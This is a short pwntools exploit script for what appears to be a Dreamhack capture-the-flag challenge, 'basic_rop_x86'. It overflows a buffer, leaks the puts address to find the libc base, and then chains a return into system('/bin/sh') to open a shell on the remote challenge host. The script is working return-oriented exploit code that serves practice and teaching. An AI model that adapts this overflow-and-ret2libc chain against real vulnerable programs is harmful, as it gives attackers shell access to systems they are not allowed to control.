#!/usr/bin/env python3

from pwn import *

PORT =  9932
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./basic_rop_x86_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x08048601
            b*0x8048611
            c
            set follow-fork-mode parent
            ''')
        input()

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()
# GDB()

pop_ebx = 0x80483d9

pl = flat(
    b"A"*0x48,
    exe.plt.puts,      
    exe.sym.main,     
    exe.got.puts   
)

p.send(pl)
p.recvuntil(b"A"*0x40)
libc_leak = u32(p.recv(4))
libc.address = libc_leak - 0x72830
log.info("libc_base: " + hex(libc.address))

pl = flat(
    b"A"*0x48,
    libc.sym.system,
    0x0,
    next(libc.search(b"/bin/sh\0"))
    )
p.send(pl)

p.interactive()